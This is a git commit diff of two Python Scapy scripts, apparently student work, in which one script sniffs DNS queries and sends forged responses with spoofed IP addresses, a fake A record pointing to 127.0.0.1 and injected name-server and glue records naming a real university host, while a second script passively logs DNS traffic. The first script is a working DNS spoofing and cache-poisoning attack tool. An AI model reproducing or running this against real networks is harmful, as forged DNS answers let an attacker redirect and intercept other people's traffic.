2a06315d6d9843e2f4a45cbe6394e017a62ddca5
w2ak <durand.clement.13@gmail.com>
2015-11-23 16:28:12 +0100

    tests

--- action.py
+++ action.py
@@ -7,17 +7,17 @@ class entier:
         self.val += 1
 i = entier()
 
-paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
+"""paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
 paquet[IP].src='0.0.0.0'
 paquet[IP].dst='0.0.0.0'
 paquet[DNS].an[0].rrname='salut.org'
-paquet[DNS].an[0].rdata='0.0.0.0'
+paquet[DNS].an[0].rdata='0.0.0.0'"""
 ip_autorite = '1.1.1.1' # change me
 
 def maFonction(a):
     i.inc()
     msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
-    if (a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a'):
+    if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
         msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
         src = a[IP].dst
@@ -35,18 +35,22 @@ def maFonction(a):
         d.rcode = 0
         d.qdcount = 1      #Question Count
         d.ancount = 1      #Answer Count
-        d.nscount = 0      #No Name server info
-        d.arcount = 0      #No additional records
+        d.nscount = 1      #No Name server info
+        d.arcount = 1      #No additional records
         d.qd = str(a[DNS].qd)
         d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
-        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
+        d.ns = DNSRR(rrname ='129.104.201.53', type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
         d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
-        spoofed = IP(src=src, dst=dst)/UDP()/d
-        sendp(spoofed, iface_hint=src)
+        dbis=DNS(qr=d.qr,opcode=d.opcode,aa=d.aa,tc=d.tc,rd=d.rd,ra=d.ra,z=d.z,rcode=d.rcode,qdcount=d.qdcount,ancount=d.ancount,nscount=d.nscount,arcount=d.arcount,qd=a[DNS].qd,an=d.an,ns=d.ns)
+        spoofed = IP(src=src, dst=dst)/UDP()/dbis
+        sendp(spoofed)
+    if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
+        msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
+        print msg
 
         
 def monFiltre(x):
-    return (x.haslayer(DNS)) and (x[DNS].qr==0L)
+    return (x.haslayer(DNS))# and (x[DNS].qr==0L)
     
 
 filtre = sys.argv[1]
--- observe.py
+++ observe.py
@@ -7,7 +7,7 @@ class entier:
         self.val += 1
 i = entier()
 
-def maFonction(a):
+def maFonctionobs(a):
     i.inc()
     msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
     if (a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a'):
@@ -17,9 +17,9 @@ def maFonction(a):
             msg = msg + ' <-- RESPONSE : ' + a[DNS].an[0].rdata
         print msg
         
-def monFiltre(x):
+def monFiltreobs(x):
     return (x.haslayer(DNS))
     
 
 filtre = sys.argv[1]
-sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
+sniff(count = 1000,lfilter = monFiltreobs,prn = maFonctionobs, timeout = 60)
